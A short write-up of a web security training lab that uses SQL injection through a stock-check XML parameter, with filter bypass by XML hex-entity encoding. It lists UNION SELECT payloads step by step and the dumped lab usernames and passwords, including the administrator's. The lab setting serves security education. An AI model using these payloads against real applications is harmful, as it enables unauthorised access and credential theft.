# Lab: SQL injection with filter bypass via XML encoding

End Goal: Exploit sqli to retrieve admin creds

Analysis:

1- detect the vulneraber parameter

`<@hex_entities>1 UNION SELECT 'a' <@/hex_entities></storeId>`

2- number of columns  =  2
since union select null , null returns nothing

3- detec the datatype
`<@hex_entities>1 UNION SELECT 'aa' <@/hex_entities>`
-> compatible with string values

4- retrive the creds

`<@hex_entities>1 UNION SELECT username || '~' || password  from users <@/hex_entities>`
->

wiener~i5gp7hecicjwwpc3be66

administrator~vopkkisl1uqx72b2byth

681 units

carlos~09j9a5m9shr6x5ymz72u
